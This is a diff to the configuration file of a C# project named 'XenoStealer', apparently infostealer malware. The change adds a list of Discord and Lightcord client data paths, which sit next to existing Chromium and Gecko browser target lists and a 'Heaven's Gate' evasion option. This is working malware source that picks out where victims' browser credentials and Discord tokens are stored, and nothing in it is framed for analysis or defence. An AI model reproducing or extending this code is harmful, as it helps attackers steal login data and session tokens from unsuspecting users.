@@ -8,16 +8,6 @@ namespace XenoStealer
 {
     public static class Configuration
     {
-
-        static Configuration() 
-        {
-            //if (!Environment.Is64BitProcess) //reverse them so the 32bit version's will come first.
-            //{
-            //    GeckoBrowsers = (Dictionary<string, string>)GeckoBrowsers.Reverse();
-            //    GeckoLibraryPaths = (Dictionary<string, string>)GeckoLibraryPaths.Reverse();
-            //}
-        }
-
         public static bool UseHeavensGateOnGecko = false;//this can sometimes be unstable, so if wanted, it can be disabled.
 
 
@@ -44,6 +34,14 @@ namespace XenoStealer
         }
         public static readonly string programFilesX86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
 
+        public static string[] DiscordPaths =
+        {
+            $"{roamingAppData}\\Discord",
+            $"{roamingAppData}\\DiscordCanary",
+            $"{roamingAppData}\\DiscordPTB",
+            $"{roamingAppData}\\DiscordDevelopment",
+            $"{roamingAppData}\\Lightcord"
+        };
 
         public static Dictionary<string, string> ChromiumBrowsers = new Dictionary<string, string>
         {
